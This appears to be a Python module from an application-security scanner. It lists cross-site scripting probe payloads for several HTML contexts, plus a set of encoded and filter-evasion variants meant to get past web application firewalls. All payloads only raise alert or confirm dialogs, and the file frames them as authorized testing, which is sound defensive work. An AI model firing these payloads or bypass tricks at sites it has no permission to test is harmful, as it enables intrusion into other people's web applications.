"""Authorized XSS probe payloads for defensive validation workflows."""

from __future__ import annotations

# Base alert-style probes (single-fire guard).
_XSS_ONCE = (
    '(function(w){try{if(w.__xss_once__)return;w.__xss_once__=1;'
    'alert("XSS Test - " + document.domain)}catch(e){}})(window)'
)

# Variants across HTML contexts — for authorized appsec testing only.
XSS_PROBE_PAYLOADS: tuple[str, ...] = (
    f"<script>{_XSS_ONCE}</script>",
    f'<img src=x onerror="{_XSS_ONCE}">',
    f'<svg onload="{_XSS_ONCE}">',
    f'<iframe src="javascript:{_XSS_ONCE}">',
    f'<body onload="{_XSS_ONCE}">',
    f'<details open ontoggle="{_XSS_ONCE}">',
    f'<svg><animate onbegin="{_XSS_ONCE}" attributeName=x dur=1s></svg>',
    f'<math onclick="{_XSS_ONCE}">CLICK</math>',
    "%3Csvg%20onload%3Dconfirm(1)%3E",
    "%253Csvg%2520onload%253Dconfirm(1)%253E",
    "&lt;img src=x onerror=alert(1)&gt;",
    "&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;",
    "&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
    "&lt;details open ontoggle=confirm(1)&gt;",
    '<svg/onload=confirm(1)>',
    '"><svg/onload=confirm(1)>',
    '<iframe srcdoc="<script>alert`1`</script>"></iframe>',
    '<a href="JaVaScRiPt:alert(1)">click</a>',
    '<script>window["ale"+"rt"]("XSS")</script>',
)

WAF_BYPASS_XSS: tuple[str, ...] = (
    "%3Csvg%20onload%3Dconfirm(1)%3E",
    "%253Csvg%2520onload%253Dconfirm(1)%253E",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<scri%00pt>alert(1)</scri%00pt>",
    "<svg><script xlink:href=data:,alert(1)></script></svg>",
)


def payloads_for_context(context: str = "html") -> list[str]:
    ctx = (context or "html").strip().lower()
    if ctx in {"waf", "bypass", "encoded"}:
        return list(WAF_BYPASS_XSS) + list(XSS_PROBE_PAYLOADS[:8])
    return list(XSS_PROBE_PAYLOADS)
